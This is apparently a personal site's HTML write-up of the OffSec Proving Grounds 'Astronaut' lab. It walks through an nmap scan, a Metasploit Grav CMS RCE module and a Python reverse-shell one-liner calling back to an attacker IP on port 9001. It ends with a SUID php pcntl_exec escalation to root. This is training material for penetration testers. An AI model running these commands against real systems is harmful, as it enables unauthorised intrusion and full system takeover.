@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OffSec Proving Grounds | Astronaut Report | Josh Chalabi</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            "cyber-black": "#0b1020",
+            "cyber-gray": "#0f1733",
+            "cyber-green": "#5eead4",
+            "cyber-purple": "#a78bfa",
+            "cyber-red": "#ff003c",
+          },
+          fontFamily: {
+            mono: ['"Fira Code"', "monospace"],
+            tech: ['"Share Tech Mono"', "monospace"],
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+
+    .term {
+      border: 1px solid #23305f;
+      border-radius: 12px;
+      overflow: hidden;
+      background: rgba(11, 16, 32, 0.85);
+    }
+    .termbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 12px;
+      background: #0f1733;
+      border-bottom: 1px solid #23305f;
+    }
+    .dots { display: flex; gap: 6px; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; }
+    .dot.red { background: #ff003c; }
+    .dot.yellow { background: #ffd60a; }
+    .dot.green { background: #22c55e; }
+    .term pre { padding: 14px 16px; font-size: 0.9rem; overflow-x: auto; }
+
+    @media print {
+      nav { display: none; }
+      body { background: #fff; color: #000; }
+    }
+  </style>
+</head>
+
+<body class="bg-cyber-black text-gray-300 font-mono min-h-screen">
+
+<nav class="fixed top-0 w-full bg-cyber-black/90 border-b border-[#23305f] z-50">
+  <div class="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
+    <span class="text-cyber-green font-tech text-xl">&lt;josh/&gt;</span>
+    <a href="../reports.html" class="text-sm text-gray-300">← Back to Reports</a>
+  </div>
+</nav>
+
+<main class="max-w-4xl mx-auto px-6 pt-28 pb-20">
+
+  <header class="mb-10">
+    <h1 class="text-3xl font-bold text-white">./ Astronaut — Proving Grounds Walkthrough</h1>
+    <p class="text-gray-400 mt-2">
+      Complete technical walkthrough of the <strong>Astronaut</strong> lab machine. This report follows the original attack path step-by-step
+      and documents enumeration, exploitation, and privilege escalation exactly as performed.
+    </p>
+  </header>
+
+  <section class="mb-12">
+    <h2 class="text-2xl font-bold text-white mb-4">Reconnaissance</h2>
+    <p class="mb-4">
+      Initial reconnaissance started with a full TCP port scan. A complete scan was chosen to avoid missing
+      any services running on non-standard ports.
+    </p>
+
+    <div class="term">
+      <div class="termbar">
+        <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+        <span class="text-xs text-gray-400">nmap</span>
+      </div>
+      <pre><code>sudo nmap -Pn -sV -sC -oN astronaut.md 192.168.141.12
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+80/tcp open  http    Apache httpd 2.4.41
+| http-ls: Volume /
+|   grav-admin/
+|_http-title: Index of /
+</code></pre>
+    </div>
+
+    <p class="mt-4">
+      The HTTP service exposed a directory listing containing <code>grav-admin</code>, strongly indicating a Grav CMS installation
+      with the admin interface publicly accessible.
+    </p>
+  </section>
+
+  <section class="mb-12">
+    <h2 class="text-2xl font-bold text-white mb-4">Initial Foothold — Grav CMS RCE</h2>
+    <p class="mb-4">
+      Based on the exposed <code>/grav-admin</code> panel, exploit research led to a known Metasploit module targeting
+      Grav CMS. The module was configured and executed as shown below.
+    </p>
+
+    <div class="term">
+      <div class="termbar">
+        <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+        <span class="text-xs text-gray-400">metasploit</span>
+      </div>
+      <pre><code>msfconsole
+search gravcms
+use linux/http/gravcms_exec
+
+set RHOSTS 192.168.141.12
+set TARGETURI /grav-admin
+set LHOST &lt;ATTACKER_IP&gt;
+
+run</code></pre>
+    </div>
+
+    <p class="mt-4">
+      The exploit returned an initial shell as the web server user. While functional, the session was unstable
+      and unsuitable for further enumeration.
+    </p>
+  </section>
+
+  <section class="mb-12">
+    <h2 class="text-2xl font-bold text-white mb-4">Shell Stabilization</h2>
+    <p class="mb-4">
+      To gain a reliable shell, a Python reverse shell was spawned. Python was confirmed to be available on the target system.
+    </p>
+
+    <div class="term">
+      <div class="termbar">
+        <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+        <span class="text-xs text-gray-400">reverse shell</span>
+      </div>
+      <pre><code>python3 -c 'import pty,socket,os; s=socket.socket(); s.connect(("&lt;ATTACKER_IP&gt;",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'</code></pre>
+    </div>
+  </section>
+
+  <section class="mb-12">
+    <h2 class="text-2xl font-bold text-white mb-4">Privilege Escalation — SUID Enumeration</h2>
+    <p class="mb-4">
+      With a stable shell established, SUID binaries were enumerated to identify potential privilege escalation vectors.
+    </p>
+
+    <div class="term">
+      <div class="termbar">
+        <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+        <span class="text-xs text-gray-400">suid enum</span>
+      </div>
+      <pre><code>find / -perm -4000 2>/dev/null
+
+/usr/bin/php7.4
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/su
+...</code></pre>
+    </div>
+
+    <p class="mt-4">
+      The presence of <code>php7.4</code> with the SUID bit set presented a direct privilege escalation opportunity
+      using documented GTFOBins techniques.
+    </p>
+  </section>
+
+  <section class="mb-12">
+    <h2 class="text-2xl font-bold text-white mb-4">Privilege Escalation — GTFOBins (PHP)</h2>
+    <p class="mb-4">
+      PHP does not drop elevated privileges when executed with the SUID bit set. This behavior allows execution
+      of a privileged shell using <code>pcntl_exec</code>.
+    </p>
+
+    <div class="term">
+      <div class="termbar">
+        <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+        <span class="text-xs text-gray-400">gtfobins</span>
+      </div>
+      <pre><code>www-data@gravity:/bin$ CMD="/bin/sh"
+CMD="/bin/sh"
+www-data@gravity:/bin$ ./php -r "pcntl_exec('/bin/sh', ['-p']);"
+# whoami
+root
+#</code></pre>
+    </div>
+
+    <p class="mt-4">
+      Execution resulted in a root shell, completing full compromise of the target system.
+    </p>
+  </section>
+
+  <section>
+    <h2 class="text-2xl font-bold text-white mb-4">Conclusion</h2>
+    <p>
+      The Astronaut machine demonstrates the risk of exposed administrative interfaces combined with unsafe SUID binaries.
+      Proper access controls and permission hardening would have prevented full system compromise.
+    </p>
+  </section>
+
+</main>
+
+<footer class="border-t border-[#23305f] py-6 text-center text-gray-500 text-sm">
+  © 2025 Josh Chalabi
+</footer>
+
+</body>
+</html>
